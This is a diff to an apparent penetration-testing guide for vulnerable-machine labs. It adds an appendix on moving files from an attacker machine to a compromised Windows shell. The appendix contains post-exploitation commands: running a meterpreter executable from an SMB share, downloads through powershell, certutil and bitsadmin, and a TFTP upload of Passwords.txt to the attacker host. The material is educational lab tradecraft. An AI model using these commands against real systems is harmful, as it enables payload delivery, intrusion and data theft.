@@ -16,7 +16,11 @@ Generally, we go through the following stages when solving a vulnerable machine:
 * :ref:`from-nothing-to-unprivileged-shell`
 * :ref:`unprivileged-shell-to-privileged-shell`
 
-In this blog post, we have mentioned, what can be done in each separate stage. Furthermore, we have also provided :ref:`tips-and-tricks` for solving vulnerable VMs. Additionally :doc:`LFF-IPS-P2-VulnerabilityAnalysis` could be referred for exploitation of any particular services (i.e. it provides information such as "If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited"). Lastly there are also appendixes related to :ref:`A1-Local-file-Inclusion` and :ref:`A2-File-Upload`.
+In this blog post, we have mentioned, what can be done in each separate stage. Furthermore, we have also provided :ref:`tips-and-tricks` for solving vulnerable VMs. Additionally :doc:`LFF-IPS-P2-VulnerabilityAnalysis` could be referred for exploitation of any particular services (i.e. it provides information such as "If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited"). Lastly there are also appendixes related to 
+
+- :ref:`A1-Local-file-Inclusion`
+- :ref:`A2-File-Upload`
+- :ref:`A3-Tranfer-Files-From-Linux-to-Windows`
 
 .. _finding-the-ip-address:
 
@@ -342,7 +346,7 @@ Furthermore, we can run the following programs to find any hidden directories.
 
 .. Tip :: Most likely, we will be using common.txt (/usr/share/wordlists/dirb/) . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)
 
-.. Tip :: If using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.
+.. Tip :: If using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories. Also, it sometimes make sense to dirb/wfuzz the IPAddress instead of the hostname like filesrv.example.com (Maybe found by automatic redirect)
 
 .. Todo:: add Gobuster?
 
@@ -4402,5 +4406,379 @@ Now, when we press submit button, probably, just make sure that the request is q
 
 .. Tip :: Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!
 
+
+.. _A3-Tranfer-Files-From-Linux-to-Windows:
+
+Appendix-III Transferring Files from Linux to Windows (post-exploitation)
+=========================================================================
+
+There would times, where we have a Windows Shell (Command Prompt) and need to copy over some files to the Windows OS. Most of the stuff has been completely taken from `Transferring Files from Linux to Windows (post-exploitation) <https://blog.ropnop.com/transferring-files-from-kali-to-windows/>`_ Here are the few methods 
+
+SMB
+---
+
+We need to setup a SMB Server on the Debian/ Kali machine
+
+SMB Server - Attacker
+^^^^^^^^^^^^^^^^^^^^^
+
+We can utilize Impacket smbserver to create a SMB Server without authentication, so that anyone can access the share and download the files.
+
+::
+
+ /usr/share/doc/python-impacket/examples/smbserver.py
+ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+ usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support]
+                    shareName sharePath
+
+ This script will launch a SMB Server and add a share specified as an argument.
+ You need to be root in order to bind to port 445. No authentication will be
+ enforced. Example: smbserver.py -comment 'My share' TMP /tmp
+
+ positional arguments:
+  shareName         name of the share to add
+  sharePath         path of the share to add
+
+ optional arguments:
+  -h, --help        show this help message and exit
+  -comment COMMENT  share's comment to display when asked for shares
+  -debug            Turn DEBUG output ON
+  -smb2support      SMB2 Support (experimental!)
+
+
+So, we can setup by using
+
+::
+
+ python smbserver.py SHELLS /root/Desktop/SHELLS
+
+ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+ [*] Config file parsed
+ [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+ [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+ [*] Config file parsed
+ [*] Config file parsed
+ [*] Config file parsed
+
+
+Accessing the share - Linux
+^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+We can use smbclient to access the share
+
+::
+
+ smbclient -L 10.10.10.10 --no-pass
+ WARNING: The "syslog" option is deprecated
+
+ 	Sharename       Type      Comment
+ 	---------       ----      -------
+ 	IPC$            Disk      
+ 	SHELLS          Disk      
+  Reconnecting with SMB1 for workgroup listing.
+  Connection to localhost failed (Error NT_STATUS_NETWORK_UNREACHABLE)
+  Failed to connect with SMB1 -- no workgroup available
+
+
+Accessing the share - Windows
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+We can use net view to check the shares
+
+::
+
+ net view \\10.10.10.10
+ 
+ Shared resources at \\10.10.10.10
+
+ (null)
+
+ Share name Type Used as Comment
+ -------------------------------
+ SHELLS     Disk
+ The command completed sucessfully
+
+Copying the Files - Windows
+^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+From the Windows Command Prompt
+
+::
+
+ dir \\10.10.14.16\SHELLS
+
+ Volume in drive \\10.10.14.16\SHELLS has no label.
+ Volume Serial Number is ABCD-EFAA
+
+ Directory of \\10.10.14.16\SHELLS
+
+ 04/10/2018  11:47 AM    <DIR>          .
+ 04/08/2018  06:25 PM    <DIR>          ..
+ 04/10/2018  11:47 AM            73,802 ps.exe
+               1 File(s)        101,696 bytes
+               2 Dir(s)  15,207,469,056 bytes free
+
+
+We can directly copy the file 
+
+::
+
+ C:\Users\bitvijays\Desktop> copy \\10.10.14.16\SHELLS\ps.exe .
+        1 file(s) copied.
+
+or directly execute it without copying
+
+::
+
+ \\10.10.14.16\SHELLS\ps.exe
+
+ ps.exe can be your meterpreter exe
+
+
+HTTP
+----
+
+Setting up the Server
+^^^^^^^^^^^^^^^^^^^^^
+
+We can use python-SimpleHTTPServer to set up a HTTP Web Server
+
+::
+
+ python -m SimpleHTTPServer
+
+Accessing the Server - Windows
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+**Windows Command Prompt**
+
+We can use powershell to download a file from a command prompt
+
+::
+
+ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10:8000/ps.exe','C:\Users\bitvijays\Desktop\ps.exe')"
+
+**CertUtil**
+
+CertUtil command can be abused to download a file from internet.
+
+::
+
+ certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+
+**Bitsadmin**
+
+::
+
+ bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10:8000/ps.exe c:\Users\bitvijays\Desktop\ps.exe
+
+
+FTP
+---
+
+We can utilize FTP to download/ upload files from a ftp server. FTP Client is usually installed on Windows by default.
+
+Setting up the Server
+^^^^^^^^^^^^^^^^^^^^^
+
+We can either use Python-pyftpdlib or Metasploit to create a FTP Server
+
+**Python-pyftpdlib**
+
+Install using apt
+
+::
+
+ apt-get install python-pyftpdlib
+
+Now from the directory we want to serve, just run the Python module. It runs on port 2121 by default (can be changed using -p parameter) and accepts anonymous authentication. To listen on the standard port: 
+
+::
+
+ /home/bitvijays/SHELLS$ python -m pyftpdlib -p 21
+
+ Usage: python -m pyftpdlib [options]
+
+ Start a stand alone anonymous FTP server.
+
+ Options:
+  -h, --help : show this help message and exit
+  -i ADDRESS, --interface=ADDRESS : specify the interface to run on (default all interfaces)
+  -p PORT, --port=PORT : specify port number to run on (default 2121)
+  -w, --write :  grants write access for logged in user (default read-only)
+  -d FOLDER, --directory=FOLDER : specify the directory to share (default current directory)
+  -n ADDRESS, --nat-address=ADDRESS : the NAT address to use for passive connections
+  -r FROM-TO, --range=FROM-TO : the range of TCP ports to use for passive connections (e.g. -r 8000-9000)
+  -D, --debug : enable DEBUG logging evel
+  -v, --version : print pyftpdlib version and exit
+  -V, --verbose : activate a more verbose logging
+  -u USERNAME, --username=USERNAME : specify username to login with (anonymous login will be disabled and password required if supplied)
+  -P PASSWORD, --password=PASSWORD : specify a password to login with (username required to be useful)
+
+**Metasploit**
+
+::
+
+  Name: FTP File Server
+  Module: auxiliary/server/ftp
+  License: Metasploit Framework License (BSD)
+  Rank: Normal
+  
+  Provided by:
+  hdm <x@hdm.io>
+
+  Available actions:
+  Name     Description
+  ----     -----------
+  Service
+
+  Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  FTPPASS                    no        Configure a specific password that should be allowed access
+  FTPROOT   /tmp/ftproot     yes       The FTP root directory to serve files from
+  FTPUSER                    no        Configure a specific username that should be allowed access
+  PASVPORT  0                no        The local PASV data port to listen on (0 is random)
+  SRVHOST   0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+  SRVPORT   21               yes       The local port to listen on.
+  SSL       false            no        Negotiate SSL for incoming connections
+  SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
+
+  Description:
+  This module provides a FTP service
+
+
+Access using FTP
+^^^^^^^^^^^^^^^^
+
+::
+
+ ftp 10.10.10.10
+ Connected to 10.10.10.10.
+ 220 FTP Server Ready
+ Name (localhost:root): anonymous
+ 331 User name okay, need password...
+ Password:
+ 230 Login OK
+ Remote system type is UNIX.
+ Using binary mode to transfer files.
+
+ ftp> ls
+ 200 PORT command successful.
+ 150 Opening ASCII mode data connection for /bin/ls
+ total 160
+ drwxr-xr-x   2 0      0       512 Jan  1  2000 ..
+ drwxr-xr-x   2 0      0       512 Jan  1  2000 .
+ -rw-r--r--   1 0      0       166 Jan  1  2000 secret.zip
+ 226 Transfer complete.
+
+ ftp> get secret.zip
+ local: secret.zip remote: secret.zip
+ 200 PORT command successful.
+ 150 Opening BINARY mode data connection for secret.zip
+ 226 Transfer complete.
+ 166 bytes received in 0.00 secs (138.4367 kB/s)
+ ftp>
+
+
+FTP can also accepts a series of commands stored in a text file
+
+Contents of a text file
+
+::
+
+ open 10.10.10.10
+ anonymous  
+ anonymous  
+ binary  
+ get ps.exe 
+ bye 
+
+
+Passing parameter to ftp
+
+::
+
+ ftp -s:filename-containing-commands
+
+The file can be created by using echo
+
+::
+
+ echo "open 10.10.10.10" >> commands.txt
+ echo "anonymous" >> commands.txt
+
+
+TFTP
+----
+
+We can also utilize TFTP to download or upload files
+
+Setting up the Server
+^^^^^^^^^^^^^^^^^^^^^
+
+Metasploit module 
+
+::
+
+ use auxiliary/server/tftp 
+ msf auxiliary(server/tftp) > info 
+
+       Name: TFTP File Server
+     Module: auxiliary/server/tftp
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+ Provided by:
+  jduck <jduck@metasploit.com>
+  todb <todb@metasploit.com>
+
+ Available actions:
+  Name     Description
+  ----     -----------
+  Service  
+
+ Basic options:
+  Name        Current Setting  Required  Description
+  ----        ---------------  --------  -----------
+  OUTPUTPATH  /tmp             yes       The directory in which uploaded files will be written.
+  SRVHOST     0.0.0.0          yes       The local host to listen on.
+  SRVPORT     69               yes       The local port to listen on.
+  TFTPROOT    /tmp             yes       The TFTP root directory to serve files from
+
+ Description:
+  This module provides a TFTP service
+
+ msf auxiliary(server/tftp) > run 
+ [*] Auxiliary module running as background job 0.
+
+ [*] Starting TFTP server on 0.0.0.0:69...
+ [*] Files will be served from /tmp
+ [*] Uploaded files will be saved in /tmp
+
+
+Accessing the Share
+^^^^^^^^^^^^^^^^^^^
+
+Downloading a file
+
+::
+
+ tftp -i 10.10.10.10 GET ps.exe
+
+Uploading a file
+
+::
+
+ tftp -i 10.10.10.10 PUT Passwords.txt
+
+Installing tftp - Windows
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+::
+
+  pkgmgr /iu:"TFTP"
 
 .. disqus::
